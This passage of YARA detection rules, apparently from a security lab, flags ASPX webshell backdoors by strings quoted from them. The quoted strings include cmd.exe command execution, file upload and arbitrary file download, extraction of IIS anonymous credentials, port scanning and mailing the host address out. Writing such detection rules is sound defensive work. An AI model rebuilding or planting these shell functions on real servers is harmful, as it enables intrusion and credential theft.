        $s10 = "<b><asp:Literal runat=\"server\" ID=\"lblPath\" Mode=\"passThrough\" /></b>" fullword ascii
        $s11 = "string driveRoot = curdrive.RootDirectory.Name.Replace(\"\\\\\", \"\");" fullword ascii
        $s12 = "Response.WriteFile(Request.QueryString[\"get\"]);" fullword ascii
        $s13 = "// exec cmd ?" fullword ascii
        $s14 = "<asp:Literal runat=\"server\" ID=\"lblDrives\" Mode=\"PassThrough\" />" fullword ascii
        $s15 = "<asp:Literal runat=\"server\" ID=\"lblDirOut\" Mode=\"PassThrough\" />" fullword ascii
        $s16 = "outstr += string.Format(\"<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>\", fstr, curfile.Length / 1024, astr);" fullword ascii
        $s17 = "<asp:TextBox runat=\"server\" ID=\"txtCmdIn\" Width=\"300\" />" fullword ascii
        $s18 = "foreach(DriveInfo curdrive in DriveInfo.GetDrives())" fullword ascii
        $s19 = "foreach (DirectoryInfo curdir in di.GetDirectories())" fullword ascii
        $s20 = "flUp.SaveAs(dir + \"/\" + fileName);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule _0378b9a95ed3af4943c6a58d87345dc944b881f7_0f8a4b1a9436476f570d004240efb2c9bbc19aa6_2607882493f7c22ca0a0a5076d953a6f892ad11b__19
{
    meta:
        description = "aspx - from files 0378b9a95ed3af4943c6a58d87345dc944b881f7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
        hash2 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
        hash3 = "9e9bcb9e2592626d80592d5308ce34cf06fb4a110d02bba16810580ba1c0c3dc"
        hash4 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
        hash5 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
        hash6 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
        hash7 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
        hash8 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
        hash9 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
        hash10 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
        hash11 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $x1 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s2 = "<asp:LinkButton ID=\"UtkN\" runat=\"server\" OnClick=\"YKpI\" Text=\"Logout\" ></asp:LinkButton> | <asp:LinkButton ID=\"RsqhW\" " ascii
        $s3 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownLis" ascii
        $s4 = "/c net user\"/> <asp:Button ID=\"SPhc\" CssClass=\"bt\" runat=\"server\" Text=\"Exploit\" OnClick=\"lRfRj\"/></td>" fullword ascii
        $s5 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> Use Regex</td>" fullword ascii
        $s6 = "oft.Jet.OLEDB.4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server" ascii
        $s7 = "58,65500\"/> <asp:Button ID=\"CmUCh\" runat=\"server\" Text=\"Scan\" CssClass=\"bt\" OnClick=\"ELkQ\"/>" fullword ascii
        $s8 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"YZw\"/> Replace</td>" fullword ascii
        $s9 = "<a href=\"#\" id=\"Bin_Button_CreateFile\" runat=\"server\">Create File</a>" fullword ascii
        $s10 = "<asp:CheckBox ID=\"ZhWSK\" runat=\"server\" Text=\"ReadOnly\" EnableViewState=\"False\"/>" fullword ascii
        $s11 = "<asp:CheckBox ID=\"ccB\" runat=\"server\" Text=\"Hidden\" EnableViewState=\"False\"/>" fullword ascii
        $s12 = "<p>Current file(fullpath)<br/><input class=\"input\" id=\"pWVL\" type=\"text\" size=\"120\" runat=\"server\"/></p>" fullword ascii
        $s13 = "<p>Reference file(fullpath)<br/><input class=\"input\" id=\"lICp\" type=\"text\" size=\"120\" runat=\"server\"/></p>" fullword ascii
        $s14 = "<asp:CheckBox ID=\"SsR\" runat=\"server\" Text=\"System\" EnableViewState=\"False\"/>" fullword ascii
        $s15 = "<asp:CheckBox ID=\"fbyZ\" runat=\"server\" Text=\"Archive\" EnableViewState=\"False\"/>" fullword ascii
        $s16 = "<td style=\"width:20%\" align=\"left\"><asp:DropDownList runat=\"server\" ID=\"Ven\" AutoPostBack=\"False\" CssClass=\"list\"><a" ascii
        $s17 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> Port : <" ascii
        $s18 = "ID=\"OREpx\" runat=\"server\" Text=\"Process\" OnClick=\"Grxk\"></asp:LinkButton> | <asp:LinkButton ID=\"jHN\" runat=\"server\" " ascii
        $s19 = "<p>Alter file<br/><input class=\"input\" id=\"QiFB\" type=\"text\" size=\"120\" runat=\"server\"/></p>" fullword ascii
        $s20 = "<p><asp:Button ID=\"JEaxV\" runat=\"server\" Text=\"Submit\" CssClass=\"bt\" OnClick=\"XXrLw\"/></p>" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x3c76 ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _9941bef59e9d17e337ac18f1b4cfc9a99dab445e_a9fb7e58fc2008830c8a785bf532288895dc79b7_20
{
    meta:
        description = "aspx - from files 9941bef59e9d17e337ac18f1b4cfc9a99dab445e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
        hash2 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
    strings:
        $x1 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
        $s2 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s3 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
        $s4 = "target='_blank'>Copy</a>|<a href='?action=del&src=\" & filepath & \"\\'\" & \" onclick='return del(this);'>Del</a></td>\"" fullword ascii
        $s5 = "<iframe name='\" + name+ \"' src='\" + src+ \"' width='\" + cstr(width) + \"' height='\" + cstr(height) + \"'></iframe>\")" fullword ascii
        $s6 = "iables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(Getparentdir(filepath.text)) &\"'</sc\" & \"ript>\")" fullword ascii
        $s7 = "objProcessInfo = winObj.InstancesOf(Wmi_Function)" fullword ascii
        $s8 = "& \"?action=goto&src=\"& server.UrlEncode(Getparentdir(a)) &\"'</script>\")" fullword ascii
        $s9 = "action=goto&src=\"& server.UrlEncode(Getparentdir(url)) &\"'</script>\")" fullword ascii
        $s10 = "command = \"dir c:\\\"" fullword ascii
        $s11 = "\") & \"\\nFile Size:\" & UpFile.postedfile.contentlength & \" bytes\\nSave Path:\" & replace(loadpath,\"\\\",\"\\\\\") & \"\\n'" ascii
        $s12 = "guru=\"<td><a href='?action=edit&src=\" & filepath2 & \"'>Edit</a>|<a href='?action=cut&src=\" & filepath2 & \"' target='_blank'" ascii
        $s13 = "dim WMI_function = \"Win32_NTLogEvent where Logfile='System'\"" fullword ascii
        $s14 = "erverVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(request.QueryString(\"src\")) &\"'</sc\" & \"ript>\")" fullword ascii
        $s15 = "for each item in objProcessInfo" fullword ascii
        $s16 = "response.Write(\"<script>alert('File \" & filename & \" upload success!\\nFile info:\\n\\nClient Path:\" & replace(UpFile.value," ascii
        $s17 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath)),\"+" ascii
        $s18 = "t.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(url) &\"'</sc\" & \"ript>\")" fullword ascii
        $s19 = "response.Write(\"<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript" ascii
        $s20 = "TTP_HOST\")+request.ServerVariables(\"URL\"),info)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0378b9a95ed3af4943c6a58d87345dc944b881f7_0f8a4b1a9436476f570d004240efb2c9bbc19aa6_2607882493f7c22ca0a0a5076d953a6f892ad11b__21
{
    meta:
        description = "aspx - from files 0378b9a95ed3af4943c6a58d87345dc944b881f7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
        hash2 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
        hash3 = "9e9bcb9e2592626d80592d5308ce34cf06fb4a110d02bba16810580ba1c0c3dc"
        hash4 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash5 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash6 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
        hash7 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash8 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
        hash9 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
        hash10 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
        hash11 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
        hash12 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
        hash13 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
        hash14 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash15 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash16 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
        hash17 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
        hash18 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $x1 = "<input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
        $s2 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s3 = "<asp:DataGrid runat=\"server\" ID=\"rom\" HeaderStyle-CssClass=\"head\" BorderWidth=\"0\" GridLines=\"None\" ></asp:DataGrid>" fullword ascii
        $s4 = "\" style=\"width:600px;height:60px;overflow:auto;\" runat=\"server\" rows=\"6\" cols=\"1\"></textarea></td></tr><tr><td>" fullword ascii
        $s5 = "<td align=\"left\" style=\"width:40%\"><pre id=\"Bin_Td_Res\" runat=\"server\"></pre></td>" fullword ascii
        $s6 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
        $s7 = "<textarea id=\"Xgvv\" runat=\"server\" class=\"area\" cols=\"100\" rows=\"25\" enableviewstate=\"true\" ></textarea>" fullword ascii
        $s8 = "<div id=\"GBYT\" runat=\"server\" visible=\"false\" enableviewstate=\"false\"></div>" fullword ascii
        $s9 = "<div style=\"float:right;\"><input id=\"Fhq\" class=\"input\" runat=\"server\" type=\"file\" style=\" height:22px\"/>" fullword ascii
        $s10 = "cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config\"/></td>" fullword ascii
        $s11 = "<asp:Table ID=\"pLWD\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s12 = "<asp:Table ID=\"UGzP\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s13 = "<asp:Table ID=\"IjsL\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s14 = "<asp:Table ID=\"VPa\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s15 = "<asp:Table ID=\"vHCs\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s16 = "<asp:Table ID=\"oJiym\" runat=\"server\" Width=\"100%\" CellSpacing=\"0\" >" fullword ascii
        $s17 = "<div runat=\"server\" id=\"ghaB\" visible=\"false\" enableviewstate=\"false\">" fullword ascii
        $s18 = "<div id=\"UHlA\" visible=\"false\" enableviewstate=\"false\" runat=\"server\">" fullword ascii
        $s19 = "<div id=\"zRyG\" runat=\"server\" enableviewstate=\"false\" visible=\"false\">" fullword ascii
        $s20 = "<div runat=\"server\" id=\"iQxm\" visible =\"false\" enableviewstate=\"false\">" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c76 ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _3db4b44135b638954a3d366902da23333ced3b87_4824681545772fb36af9115120dda094943a6940_78c939717436eb5ca6707941a487a8f3d358f530__22
{
    meta:
        description = "aspx - from files 3db4b44135b638954a3d366902da23333ced3b87.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash2 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash3 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash4 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
        hash5 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash6 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash7 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
    strings:
        $s1 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s2 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s3 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s4 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s5 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s6 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
        $s7 = "\" OnClick=\"PPtK\"></asp:LinkButton> | <asp:LinkButton ID=\"PVQ\" runat=\"server\" Text=\"Serv-U" fullword ascii
        $s8 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"YZw\"/> " fullword ascii
        $s9 = "<td style=\"width:20%\" align=\"left\"><asp:Button CssClass=\"bt\" id=\"axy\" runat=\"server\" onclick=\"NBy\" Text=\"" fullword ascii
        $s10 = ": <input class=\"input\" runat=\"server\" id=\"NMd\" type=\"text\" size=\"20\" value=\"#l@$ak#.lk;0@P\"/></td>" fullword ascii
        $s11 = "?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s12 = "<tr align=\"center\"><td colspan=\"5\"><br/><asp:Button ID=\"FJE\" CssClass=\"bt\" runat=\"server\" Text=\"" fullword ascii
        $s13 = "<asp:TableRow CssClass=\"head\"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>" fullword ascii
        $s14 = ": <input class=\"input\" runat=\"server\" id=\"HlQl\" type=\"text\" size=\"20\" value=\"43958\"/></td>" fullword ascii
        $s15 = ": <input class=\"input\" runat=\"server\" id=\"ZHS\" type=\"text\" size=\"20\" value=\"80\"/></td></tr>" fullword ascii
        $s16 = ": <input class=\"input\" runat=\"server\" id=\"iXdh\" type=\"text\" size=\"20\" value=\"3389\"/></td>" fullword ascii
        $s17 = "ZGKh.Text=\"<a href=\\\"javascript:if(confirm('" fullword ascii
        $s18 = "<asp:LinkButton ID=\"UtkN\" runat=\"server\" OnClick=\"YKpI\" Text=\"" fullword ascii
        $s19 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('" fullword ascii
        $s20 = "<br/><input class=\"input\" id=\"pWVL\" type=\"text\" size=\"120\" runat=\"server\"/></p>" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _9f83df217f792caae3d2c1bd613e79e527ee1ac5_b789f8cffef6ba3b391cd725d057f1bd580e2367_23
{
    meta:
        description = "aspx - from files 9f83df217f792caae3d2c1bd613e79e527ee1ac5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "378b4a644f60d3e469486ec4ee1911330b36323185b82e1a3b96a1ec8e795638"
        hash2 = "53bbd2c7a54e1d98f5679809860e424365be07feb962074f57a1a084ba3933ad"
    strings:
        $s1 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + Path.GetFileName(file));" fullword ascii
        $s2 = "Response.AddHeader(\"Content-Length\", new FileInfo(file).Length.ToString());" fullword ascii
        $s3 = "string[] tempDrives = Environment.GetLogicalDrives();" fullword ascii
        $s4 = "foreach (System.IO.DirectoryInfo dirs in dirInfo.GetDirectories(\"*.*\"))" fullword ascii
        $s5 = "if (Request.Params[\"operation\"] == \"download\")" fullword ascii
        $s6 = "foreach (System.IO.FileInfo fileInfo in dirInfo.GetFiles(\"*.*\"))" fullword ascii
        $s7 = "for (int index = 0; index < tempDrives.Length; index++)" fullword ascii
        $s8 = "Response.Write(this.DownloadFile());" fullword ascii
        $s9 = "response.Append(\"&operation=list\\\">\");" fullword ascii
        $s10 = "string[] drives = Environment.GetLogicalDrives();" fullword ascii
        $s11 = "private string DownloadFile()" fullword ascii
        $s12 = "response.Append(\"&operation=list>\");" fullword ascii
        $s13 = "else if (Request.Params[\"operation\"] == \"list\")" fullword ascii
        $s14 = "DirectoryInfo parentDirInfo = Directory.GetParent(dir);" fullword ascii
        $s15 = "System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(dir);" fullword ascii
        $s16 = "response.Append(\"</tr></table><table><tr><td>&nbsp;</td></tr>\");" fullword ascii
        $s17 = "dir = tempDrives[index];" fullword ascii
        $s18 = "if (tempDrives.Length > 0)" fullword ascii
        $s19 = "return \"File downloaded\";" fullword ascii
        $s20 = "response.Append(\"</a></td></tr></table><table>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule _355c35e602e694b99b7094916b7e6d8dd664e931_5af49624cc19a4cd70989287c7d3d3edec0714c5_898ebfa1757dcbbecb2afcdab1560d72ae6940de__24
{
    meta:
        description = "aspx - from files 355c35e602e694b99b7094916b7e6d8dd664e931.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "67db101a6c6b1b1bf58183ca513025048dc719ae4cbdba408092f0df296f9a67"
        hash2 = "b3303b610b955dfc13d3f554a042661f7249e83a78888377192d0eec6c2e925e"
        hash3 = "ba08d9125617307e4f8235f02cf1d5928374eea275456914e51d8a367657d10c"
        hash4 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
        hash5 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
        hash6 = "80513c8872794816db8f64f796db5f42bf2df7f287141aea2de0c64e22ebd01a"
    strings:
        $s1 = "response.addHeader(\"Content-Length\",stream.Size)" fullword ascii
        $s2 = "GetSize=temp\\1024\\1024\\1024 & \" GB\"" fullword ascii
        $s3 = "GetSize=temp\\1024\\1024 & \" MB\"" fullword ascii
        $s4 = "GetSize=temp & \" bytes\"" fullword ascii
        $s5 = "GetSize=temp\\1024 & \" KB\"" fullword ascii
        $s6 = "directory.createdirectory(b & path.getfilename(a & xdir.name))" fullword ascii
        $s7 = "Function GetSize(temp)" fullword ascii
        $s8 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath)),\"+" ascii
        $s9 = "response.binaryWrite(stream.read)" fullword ascii
        $s10 = "for i =0 to Directory.GetLogicalDrives().length-1" fullword ascii
        $s11 = "UpFile.postedfile.saveas(loadpath)" fullword ascii
        $s12 = "Sub RunCMD(Src As Object, E As EventArgs)" fullword ascii
        $s13 = "resultSQL.Text=SqlCMD.Text & vbcrlf & \"<pre>\" & strResult & \"</pre>\"" fullword ascii
        $s14 = "if temp\\1024\\1024 < 1024 then" fullword ascii
        $s15 = "if temp\\1024 < 1024 then" fullword ascii
        $s16 = "response.contentType=\"application/octet-stream\"" fullword ascii
        $s17 = "thisfile.LastAccessTime = thatfile.LastAccessTime" fullword ascii
        $s18 = "Dim myString As String = myStreamReader.Readtoend()" fullword ascii
        $s19 = "if temp < 1024 then" fullword ascii
        $s20 = "GetStartedTime=cint(ms/(1000*60*60))" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _a34ca74451e192d9ec53ba2e4ac04a01ee73aba6_fd45a72bda0a38d5ad81371d68d206035cb71a14_25
{
    meta:
        description = "aspx - from files a34ca74451e192d9ec53ba2e4ac04a01ee73aba6.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
        hash2 = "80c56db3cc4d03dcc1e0d512d5b212ded84110a3a98381efe625689a6675ca1d"
    strings:
        $s1 = "tfit.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Listdir','\" + MVVJ(HlyU.Properties[\"Path\"].V" fullword ascii
        $s2 = "TR.Attributes[\"title\"] = \"Site:\" + child.Properties[\"ServerComment\"].Value.ToString();" fullword ascii
        $s3 = "<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
        $s4 = "cmd.CommandText = TextBoxSqlCon.Text;" fullword ascii
        $s5 = "exe.StartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "tfit.Text = sb.ToString().Substring(0, sb.ToString().Length - 4);" fullword ascii
        $s7 = "tfit.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Listdir','\" + MVVJ(HlyU.Properties[\"Path\"].Value.ToString()) + \"')" ascii
        $s8 = "alue.ToString()) + \"')\\\">\" + HlyU.Properties[\"Path\"].Value.ToString() + \"</a>\";" fullword ascii
        $s9 = "tfit.Text = HlyU.Properties[\"AnonymousUserPass\"].Value.ToString();" fullword ascii
        $s10 = "tfit.Text = HlyU.Properties[\"AnonymousUserName\"].Value.ToString();" fullword ascii
        $s11 = "DirectoryEntry newdir = new DirectoryEntry(mWGEm + \"/\" + child.Name.ToString());" fullword ascii
        $s12 = "byte[] tmp = Encoding.Default.GetBytes(instr);" fullword ascii
        $s13 = "<div id=\"tnQRF\" runat=\"server\" visible=\"false\" enableviewstate=\"false\"></div>" fullword ascii
        $s14 = "DirectoryEntry HlyU = newdir.Children.Find(\"root\", \"IIsWebVirtualDir\");" fullword ascii
        $s15 = "else if (page == \"iis\" && Session[\"root\"] != null)" fullword ascii
        $s16 = "exe.StartInfo.RedirectStandardError = true;" fullword ascii
        $s17 = "PropertyValueCollection pc = child.Properties[\"ServerBindings\"];" fullword ascii
        $s18 = "GlI.Style.Add(\"word-break\", \"break-all\");" fullword ascii
        $s19 = "string mWGEm = \"IIS://localhost/W3SVC\";" fullword ascii
        $s20 = "exe.StartInfo.RedirectStandardInput = true;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

rule _3db4b44135b638954a3d366902da23333ced3b87_4824681545772fb36af9115120dda094943a6940_78c939717436eb5ca6707941a487a8f3d358f530__26
{
    meta:
        description = "aspx - from files 3db4b44135b638954a3d366902da23333ced3b87.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash2 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash3 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash4 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
        hash5 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash6 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash7 = "78aee68bbd818cebb3d2621594522ab17d7b95ad5b0e81cdd82d17906c5ac4eb"
        hash8 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
    strings:
        $s1 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s2 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s3 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s4 = "\" OnClick=\"dMx\"></asp:LinkButton> | <asp:LinkButton ID=\"KHbEd\" runat=\"server\" Text=\"" fullword ascii
        $s5 = "\" OnClick=\"Olm\"></asp:LinkButton> | <asp:LinkButton ID=\"wmgnK\" runat=\"server\" Text=\"" fullword ascii
        $s6 = "\" OnClick=\"HtB\"></asp:LinkButton> | <asp:LinkButton ID=\"FeV\" runat=\"server\" Text=\"" fullword ascii
        $s7 = "\" OnClick=\"ilC\"></asp:LinkButton> | <asp:LinkButton ID=\"PHq\" runat=\"server\" Text=\"" fullword ascii
        $s8 = "\" OnClick=\"Grxk\"></asp:LinkButton> | <asp:LinkButton ID=\"jHN\" runat=\"server\" Text=\"" fullword ascii
        $s9 = "\" OnClick=\"jXhS\"></asp:LinkButton> | <asp:LinkButton ID=\"jNDb\" runat=\"server\" Text=\"" fullword ascii
        $s10 = "\" OnClick=\"KjPi\"></asp:LinkButton> | <asp:LinkButton ID=\"OREpx\" runat=\"server\" Text=\"" fullword ascii
        $s11 = "\" OnClick=\"xSy\"></asp:LinkButton> | <asp:LinkButton ID=\"HDQ\" runat=\"server\" Text=\"" fullword ascii
        $s12 = "\" OnClick=\"cptS\" ></asp:LinkButton> | <asp:LinkButton ID=\"AoI\" runat=\"server\" Text=\"" fullword ascii
        $s13 = "</a> | <a href=\"#\" id=\"Bin_Button_CreateFile\" runat=\"server\">" fullword ascii
        $s14 = "\" OnClick=\"lbjLD\"/></div><asp:LinkButton ID=\"OLJFp\" runat=\"server\" Text=\"" fullword ascii
        $s15 = "</asp:ListItem><asp:ListItem Value=\"content\" Selected=\"True\">" fullword ascii
        $s16 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_Files.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('Bin_CFile" ascii
        $s17 = "\" OnClick=\"wDZ\"/> <asp:Button ID=\"giX\" CssClass=\"bt\" runat=\"server\" Text=\"" fullword ascii
        $s18 = "\" CssClass=\"bt\" OnClick=\"DGCoW\"/> <asp:Button ID=\"iCNu\" runat=\"server\" Text=\"" fullword ascii
        $s19 = "\" OnClick=\"vJNsE\"/> <asp:Button ID=\"GFsm\" CssClass=\"bt\" runat=\"server\" Text=\"" fullword ascii
        $s20 = "ue+Bin_Files.Name)+\"',filename);} \\\">" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

